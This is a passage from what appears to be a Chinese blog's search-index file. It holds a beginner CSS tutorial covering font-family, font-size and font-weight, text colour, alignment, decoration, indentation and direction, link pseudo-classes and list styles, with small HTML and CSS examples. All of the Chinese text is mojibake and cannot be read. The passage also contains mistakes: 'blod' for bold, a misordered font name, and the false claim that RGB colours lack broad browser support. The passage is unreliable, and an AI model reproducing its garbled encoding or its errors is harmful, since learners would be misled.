id="csså­—ä½“-1"><a href="#csså­—ä½“-1" class="headerlink" title="csså­—ä½“"></a>csså­—ä½“</h4><ul><li><p><strong>å­—ä½“ç³»åˆ—</strong>ï¼šfont-family å±æ€§è®¾ç½®æ–‡æœ¬çš„å­—ä½“ç³»åˆ—ï¼Œåº”è¯¥è®¾ç½®å‡ ä¸ªå­—ä½“åç§°ä½œä¸ºä¸€ç§â€åå¤‡â€æœºåˆ¶ã€‚</p><p>ä¾‹ï¼š<code>font-family:&quot;é»‘ä½“&quot;, &quot;å®‹ä½“&quot;,&quot;å¾®è½¯é»‘é›…&quot;;</code></p></li><li><p><strong>å­—ä½“æ ·å¼</strong>:<code>font-style:italic;</code>æ–œä½“</p></li><li><p><strong>å­—ä½“å¤§å°</strong>ï¼šfont-size å±æ€§è®¾ç½®æ–‡æœ¬çš„å¤§å°ã€‚<code>font-size:40px;</code> font-weight: è®¾ç½®å…¶ç²—ç»†ã€‚font-weight:</p><p>normal lighter blod;</p></li></ul><p>ç»ƒä¹ ï¼š</p><pre><code class="html">body {    font-family: &quot;é»‘ä½“&quot;,&quot;å®‹ä½“&quot;;    font-style:italic;    font-size:80px;    font-weight: bold;}  /*5.css */ </code></pre><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;æ–‡å­—-å­—ä½“&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;5.css&quot;&gt;&lt;/head&gt;&lt;body&gt;    è¿™æ˜¯ä¸€æ®µå­—    &lt;br&gt;    hello world!&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="CSS-æ–‡æœ¬"><a href="#CSS-æ–‡æœ¬" class="headerlink" title="CSS - æ–‡æœ¬"></a>CSS - æ–‡æœ¬</h2><h4 id="æ–‡æœ¬å±æ€§é›†åˆ"><a href="#æ–‡æœ¬å±æ€§é›†åˆ" class="headerlink" title="æ–‡æœ¬å±æ€§é›†åˆ"></a>æ–‡æœ¬å±æ€§é›†åˆ</h4><ul><li><strong>colorå±æ€§ç”¨äºè®¾ç½®æ–‡æœ¬çš„é¢œè‰²</strong></li><li><strong>directionå±æ€§ç”¨äºè®¾ç½®æ–‡æœ¬æ–¹å‘ã€‚</strong></li><li><strong>letter-spacingå±æ€§ç”¨äºåœ¨ç»„æˆå•è¯çš„å­—æ¯ä¹‹é—´æ·»åŠ æˆ–å‡å»ç©ºæ ¼ã€‚</strong> </li><li><strong>text-indentå±æ€§ç”¨äºç¼©è¿›æ®µè½çš„æ–‡æœ¬ã€‚</strong></li><li><strong>text-alignå±æ€§ç”¨äºå¯¹é½æ–‡æ¡£çš„æ–‡æœ¬ã€‚</strong> </li><li><strong>text-decorationå±æ€§ç”¨äºä¸‹åˆ’çº¿ï¼Œä¸Šåˆ’çº¿å’Œåˆ é™¤æ–‡æœ¬ã€‚</strong></li><li><strong>text-transformå±æ€§ç”¨äºå¤§å†™æ–‡æœ¬æˆ–å°†æ–‡æœ¬è½¬æ¢ä¸ºå¤§å†™æˆ–å°å†™å­—æ¯ã€‚</strong></li><li><strong>white-spaceå±æ€§ç”¨äºæ§åˆ¶æ–‡æœ¬çš„æµå’Œæ ¼å¼ã€‚</strong></li><li><strong>text-shadowå±æ€§ç”¨äºè®¾ç½®æ–‡æœ¬å‘¨å›´çš„æ–‡æœ¬é˜´å½±ã€‚</strong></li></ul><h4 id="æ–‡æœ¬é¢œè‰²ï¼š"><a href="#æ–‡æœ¬é¢œè‰²ï¼š" class="headerlink" title="æ–‡æœ¬é¢œè‰²ï¼š"></a>æ–‡æœ¬é¢œè‰²ï¼š</h4><ul><li>åå…­è¿›åˆ¶å€¼ - å¦‚: <strong>ï¼ƒFF0000</strong></li><li>ä¸€ä¸ªRGBå€¼ - å¦‚: <strong>RGB(255,0,0)</strong>     ==ä¸æ¨èä½¿ç”¨å¤ªå¤šæµè§ˆå™¨ä¸æ”¯æŒ==</li><li>é¢œè‰²çš„åç§° - å¦‚: <strong>red</strong></li></ul><pre><code class="html">body {color:red;}h1 {color:#00ff00;}h2 {color:rgb(255,0,0);}</code></pre><h4 id="æ–‡æœ¬çš„å¯¹é½æ–¹å¼"><a href="#æ–‡æœ¬çš„å¯¹é½æ–¹å¼" class="headerlink" title="æ–‡æœ¬çš„å¯¹é½æ–¹å¼"></a>æ–‡æœ¬çš„å¯¹é½æ–¹å¼</h4><p>æ–‡æœ¬å¯å±…ä¸­æˆ–å¯¹é½åˆ°å·¦æˆ–å³,ä¸¤ç«¯å¯¹é½.</p><pre><code class="html">.a1{    text-align:right;}.a2{    text-align:center;}.a3{    text-align:left;}</code></pre><pre><code class="html">&lt;body&gt;    &lt;p class=&quot;a1&quot;&gt;è¿™æ˜¯ä¸€æ®µå­—&lt;/p&gt;    &lt;br&gt;     &lt;p class=&quot;a2&quot;&gt;hello world!&lt;/p&gt;     &lt;p class=&quot;a3&quot;&gt;hhhhaaaa&lt;/p&gt;&lt;/body&gt;</code></pre><h4 id="æ–‡æœ¬ä¿®é¥°"><a href="#æ–‡æœ¬ä¿®é¥°" class="headerlink" title="æ–‡æœ¬ä¿®é¥°"></a>æ–‡æœ¬ä¿®é¥°</h4><p>è£…é¥°æ–‡å­—ï¼Œå€¼ä¸ºnoneï¼ˆå»æ‰ä¿®é¥°ï¼‰ï¼Œunderlineï¼Œoverlineï¼Œline-throughï¼Œblinkã€‚</p><pre><code class="html">.a1{    text-decoration:overline;}.a2{    text-decoration:line-through;}.a3{    text-decoration:underline;}</code></pre><h4 id="æ–‡æœ¬ç¼©è¿›"><a href="#æ–‡æœ¬ç¼©è¿›" class="headerlink" title="æ–‡æœ¬ç¼©è¿›"></a>æ–‡æœ¬ç¼©è¿›</h4><p>æ–‡æœ¬ç¼©è¿›å±æ€§æ˜¯ç”¨æ¥æŒ‡å®šæ–‡æœ¬çš„ç¬¬ä¸€è¡Œçš„ç¼©è¿›ã€‚</p><p><code>p {text-indent:50px;}</code></p><h4 id="æ–‡æœ¬æ–¹å‘"><a href="#æ–‡æœ¬æ–¹å‘" class="headerlink" title="æ–‡æœ¬æ–¹å‘"></a>æ–‡æœ¬æ–¹å‘</h4><p>å€¼æ˜¯ltræˆ–rtlã€‚</p><pre><code class="html">.a{  direction:rtl;   }</code></pre><p>æ–‡å­—å°±å…ˆå†™åˆ°è¿™ã€‚</p><h2 id="CSS-é“¾æ¥"><a href="#CSS-é“¾æ¥" class="headerlink" title="CSS é“¾æ¥"></a>CSS é“¾æ¥</h2><h4 id="é“¾æ¥æ ·å¼"><a href="#é“¾æ¥æ ·å¼" class="headerlink" title="é“¾æ¥æ ·å¼"></a>é“¾æ¥æ ·å¼</h4><ol><li><strong>a:link - æ­£å¸¸ï¼Œæœªè®¿é—®è¿‡çš„é“¾æ¥</strong></li><li><strong>a:visited - ç”¨æˆ·å·²è®¿é—®è¿‡çš„é“¾æ¥</strong></li><li><strong>a:hover - å½“ç”¨æˆ·é¼ æ ‡æ”¾åœ¨é“¾æ¥ä¸Šæ—¶</strong></li><li><strong>a:active - é“¾æ¥è¢«ç‚¹å‡»çš„é‚£ä¸€åˆ»</strong></li></ol><p><code>a:link {color: red;}</code></p><h2 id="CSSåˆ—è¡¨"><a href="#CSSåˆ—è¡¨" class="headerlink" title="CSSåˆ—è¡¨"></a>CSSåˆ—è¡¨</h2><p>å¸¸ç”¨çš„å°±æ˜¯</p><pre><code class="html">ul{    list-style-type: none;      list-style-type: disc;    å®å¿ƒåœ†    list-style-type: circle;    ç©ºå¿ƒåœ†    list-style-type: square;      å®å¿ƒæ–¹æ ¼}</code></pre><p>æœ€å¸¸ç”¨å°±æ˜¯ none ç„¶åæ¢æˆè‡ªå·±æƒ³å¼„æˆçš„å›¾ç‰‡ã€‚</p><p> ol å¯¹åº”å°±æ˜¯ <code>lower-alpha</code>  <code>upper-alpha</code> <code>lower-roman</code>ç­‰ç­‰ï¼›</p><p><strong>ä½œä¸ºåˆ—è¡¨é¡¹æ ‡è®°çš„å›¾åƒ</strong></p><pre><code>ul{    list-style-image: url(&#39;&#39;);}</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>css</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
